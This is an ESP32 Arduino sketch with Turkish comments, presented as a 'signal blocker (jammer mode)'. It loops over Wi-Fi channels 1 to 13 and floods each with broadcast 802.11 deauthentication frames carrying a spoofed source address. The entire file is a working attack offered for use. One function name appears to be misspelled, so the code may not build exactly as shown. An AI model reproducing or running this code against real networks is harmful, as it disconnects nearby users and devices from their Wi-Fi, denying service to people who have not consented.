#include <WiFi.h>
#include "esp_wifi.h"

// --- AYARLAR ---
uint8_t channel = 1; 

void setup() {
  Serial.begin(115200);
  Serial.println("[!] ESP32 Signal Blocker (Jammer Mode) Baslatiliyor...");

  WiFi.mode(WIFI_STA);
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_protocol(WIFI_IF_STA, WIFI_PROTOCOL_11B | WIFI_PROTOCOL_11G | WIFI_PROTOCOL_11N);
  
  Serial.println("[+] Moduller aktif. Sinyal bloklama basliyor...");
}

void loop() {
  for (int ch = 1; ch <= 13; ch++) {
    esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
    
    for (int i = 0; i < 100; i++) {
      sendDeauthBurst();
      delay(2);
    }
  }
}

void sendDeauthBurst() {
  uint8_t packet[26] = {
    0xC0, 0x00,                         // Frame Control (Deauthentication)
    0x3A, 0x01,                         // Duration
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Receiver MAC (Target)
    0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, // Transmitter MAC (Source AP)
    0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, // BSSID
    0x00, 0x00,                         // Sequence Number
    0x07, 0x00                          // Reason Code
  };

  esp_wifi_802_11_tx(WIFI_IF_STA, packet, sizeof(packet));
}